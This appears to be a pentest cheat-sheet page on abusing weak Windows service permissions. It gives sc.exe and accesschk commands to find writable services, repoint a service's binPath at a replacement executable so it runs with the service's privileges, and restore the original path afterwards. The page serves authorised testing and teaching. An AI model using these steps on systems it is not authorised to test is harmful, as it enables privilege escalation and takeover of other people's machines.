# Service permissions

Needs `SERVICE_CHANGE_CONFIG` on the service + a usable start trigger. `SERVICE_START` and `SERVICE_STOP` are separate rights.

```powershell
whoami /groups
sc.exe qc <SERVICE>
accesschk.exe -accepteula -c -w -v "Authenticated Users" *
accesschk.exe -c -v <USER> <SERVICE>
```
- Check AccessChk output against your own token groups.
- Save `sc.exe qc` output (`BINARY_PATH_NAME`, account, start mode) and `sc.exe query` state first.

```powershell
sc.exe config <SERVICE> binPath= "C:\Path\To\replacement.exe"
sc.exe query <SERVICE>
# only if running and SERVICE_STOP is confirmed; wait for STOPPED:
sc.exe stop <SERVICE>
# only with SERVICE_START or another confirmed trigger:
sc.exe start <SERVICE>
```
- Keep the space after `binPath=`.
- Command line with embedded quotes: native `sc.exe` quoting breaks in PowerShell → [CIM workflow](../ad/privileged-groups.md#server-operators-exact-service-rights-benign-execution-proof).
- Non-service exe still runs its side effect, then the SCM reports a startup error.

Restore the original command line:
```powershell
sc.exe config <SERVICE> binPath= "<ORIGINAL-PATH-AND-ARGS>"
sc.exe qc <SERVICE>
```
